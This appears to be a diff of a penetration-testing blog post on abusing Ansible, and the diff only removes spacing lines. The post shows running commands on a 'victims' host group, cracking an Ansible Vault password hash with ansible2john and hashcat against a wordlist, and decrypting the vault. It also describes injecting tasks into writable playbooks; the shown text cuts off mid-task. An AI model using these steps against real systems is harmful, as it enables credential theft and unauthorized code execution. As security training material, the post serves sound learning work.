@@ -12,7 +12,6 @@ Ansible is an infrastructure configuration engine that enables IT personnel to d
 Config in <span style="color:red">/etc/ansible/hosts</span>.
 The _ansibleadm_ user on the controller issues commands.
 From the command machine:
-&nbsp;
 {% highlight shell %}
 ansible victims -a "whoami"
 {% endhighlight %}
@@ -42,7 +41,6 @@ I.E.
 {% endhighlight %}
 &nbsp;
 Ansible has a new features called _Ansible Vault_ to securely store credentials for playbooks:
-&nbsp;
 {% highlight yaml %}
 ansible_become_pass: !vault |
           $ANSIBLE_VAULT;1.1;AES256
@@ -54,20 +52,17 @@ ansible_become_pass: !vault |
 {% endhighlight %}
 &nbsp;
 Copy the hash starting with "$ANSIBLE_VAULT......." and use <span style="color:red">ansible2john</span> to convert it in a crackable way to then:
-&nbsp;
 {% highlight shell %}
 hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
 {% endhighlight %}
 &nbsp;
 to then decrypt the vault like:
-&nbsp;
 {% highlight shell %}
 cat pw.txt | ansible-vault decrypt
 {% endhighlight %}
 &nbsp;
 Also, if the playbook files used on the controller have world-writable permissions or if we can find a way to write to them (perhaps through an exploit), we can inject tasks that will then be run the next time the playbook is run.
 I.E. to add to the yaml playbook:
-&nbsp;
 {% highlight yaml %}
 - name: Create a directory if it does not exist
       file:
